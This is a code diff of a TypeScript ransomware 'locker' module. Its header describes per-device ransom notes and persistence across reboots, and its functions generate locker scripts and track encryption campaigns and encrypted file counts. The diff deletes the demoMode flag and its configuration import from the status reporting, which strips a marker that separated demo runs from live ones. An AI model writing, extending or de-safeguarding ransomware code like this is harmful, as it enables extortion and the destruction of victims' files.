@@ -5,7 +5,6 @@
  * custom ransom notes per device, and persistence across reboots.
  */
 
-import { getMsfConfig } from "./msf-config";
 import * as fs from "fs";
 import * as path from "path";
 import * as os from "os";
@@ -54,7 +53,6 @@ export type KeyPair = {
 };
 
 export type LockerStatus = {
-  demoMode: boolean;
   campaignsCount: number;
   keysAvailable: boolean;
   totalFilesEncrypted: number;
@@ -469,12 +467,10 @@ export function generateLockerScript(
 // ── Status ──────────────────────────────────────────────────
 
 export function getLockerStatus(): LockerStatus {
-  const config = getMsfConfig();
   const campaigns = listCampaigns();
   const totalFiles = campaigns.reduce(function (sum, c) { return sum + c.filesEncrypted; }, 0);
 
   return {
-    demoMode: config.demoMode,
     campaignsCount: campaigns.length,
     keysAvailable: fs.existsSync(KEYSTORE_DIR),
     totalFilesEncrypted: totalFiles,
